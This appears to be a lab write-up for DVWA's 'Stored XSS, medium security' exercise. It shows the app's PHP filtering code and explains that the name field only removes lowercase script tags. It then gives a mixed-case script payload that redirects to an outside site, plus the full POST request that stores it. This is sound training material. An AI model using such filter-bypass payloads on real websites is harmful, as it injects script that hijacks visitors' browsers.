@@ -1,0 +1,51 @@
+#+TITLE: DVWA - XSS Stored Medium
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  The only change is that now in the ~message~ field there's an added filtering with respect to XSS
+
+  #+begin_src php
+  // Sanitize message input
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $message = htmlspecialchars( $message );
+  #+end_src
+  
+  #+begin_src php
+  // Sanitize name input
+    $name = str_replace( '<script>', '', $name );
+    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+  #+end_src
+
+* Solution
+  We can bypass the filter by using the fact that the script tag is
+  case insensitive, and therefore the following payload will trigger
+  once again the redirect
+
+  #+begin_src html
+<ScriPt> window.location.replace('https://leonardotamiano.xyz'); </ScriPt>
+  #+end_src  
+
+  The vulnerable field is the ~name~ field, and not the ~message~ field,
+  which is properly sanitized with the ~htmlspecialchars~ function.
+
+  The final request is
+
+  #+begin_example
+POST /vulnerabilities/xss_s/ HTTP/1.1
+Host: evil
+Content-Length: 123
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/xss_s/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=qnb8tctsqlju8alqdo6olclav4; security=medium
+Connection: close
+
+txtName=<ScriPt>+window.location.replace("https%3a//leonardotamiano.xyz")%3b+</ScriPt>&mtxMessage=yo&btnSign=Sign+Guestbook
+  #+end_example
